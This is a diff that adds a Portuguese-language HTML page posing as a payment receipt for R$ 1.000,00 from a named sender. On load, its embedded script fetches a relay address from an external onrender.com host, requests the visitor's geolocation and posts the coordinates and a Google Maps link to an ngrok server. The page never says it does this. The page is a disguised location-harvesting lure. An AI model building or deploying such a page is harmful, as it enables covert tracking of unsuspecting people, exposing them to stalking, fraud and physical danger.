@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> Victor Paranhos Costa</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+    </div>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+
+  </div>
+
+  <script>
+    // Adiciona a URL do servidor (Ngrok) aqui
+    var API_BASE_URL = '';
+  
+    // Função de erro para localização
+    function handleError(error) {
+      console.error('Erro ao obter localização:', error);
+      alert('Falha ao obter localização. Tente novamente.');
+    }
+  
+    window.addEventListener("load", async () => {
+      try {
+        // Obtém a URL dinâmica do Ngrok
+        const response = await fetch('https://localization-j74h.onrender.com/get-ngrok-url');
+        const data = await response.json();
+        
+        if (data.url) {
+          API_BASE_URL = data.url; // Definir a URL do Ngrok
+  
+          // Depois obtém a localização
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+          } else {
+            alert("Geolocalização não suportada pelo navegador");
+          }
+        } else {
+          console.error('Não foi possível obter a URL do Ngrok');
+          alert('Erro ao conectar com o servidor');
+        }
+  
+      } catch (error) {
+        console.error('Erro ao obter URL do Ngrok:', error);
+        alert('Erro de conexão com o servidor');
+      }
+    });
+  
+    // Função para enviar a localização
+    async function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+  
+      try {
+        const response = await fetch(`${API_BASE_URL}/send-location`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ latitude, longitude, maps })
+        });
+  
+        const data = await response.json();
+        if (!data.success) {
+          alert("Erro ao enviar o comprovante.");
+        }
+      } catch (error) {
+        console.error("Erro:", error);
+        alert("Falha na comunicação com o servidor");
+      }
+    }
+  </script>
+</body>
+
+</html>
